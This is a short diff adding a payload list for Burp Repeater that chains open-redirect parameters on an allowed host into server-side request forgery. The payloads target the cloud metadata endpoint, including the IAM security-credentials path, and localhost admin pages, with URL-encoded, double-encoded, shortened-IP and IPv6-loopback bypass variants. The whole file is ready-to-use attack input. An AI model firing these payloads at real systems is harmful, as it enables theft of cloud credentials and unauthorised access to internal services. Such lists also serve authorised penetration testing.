@@ -1,0 +1,14 @@
+
+# Try these in Repeater (swap <allowed-host> and param names you discover)
+https://<allowed-host>/redirect?next=http://169.254.169.254/latest/meta-data/
+https://<allowed-host>/redirect?next=http%3a%2f%2f169.254.169.254%2flatest%2fmeta-data%2f
+https://<allowed-host>/redir?url=http://127.0.0.1/
+https://<allowed-host>/redir?url=http%3a%2f%2f127.0.0.1%2f
+https://<allowed-host>/bounce?return=http://169.254.169.254/
+https://<allowed-host>/go?u=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Extras that often help
+https://<allowed-host>/redirect?next=http://localhost/admin
+https://<allowed-host>/redirect?next=http://127.1/admin
+https://<allowed-host>/redirect?next=http://[::1]/admin
+# Double-encode hop param name if needed (rare)
+https://<allowed-host>/redirect?next=http%253a%252f%252f127.0.0.1%252fadmin
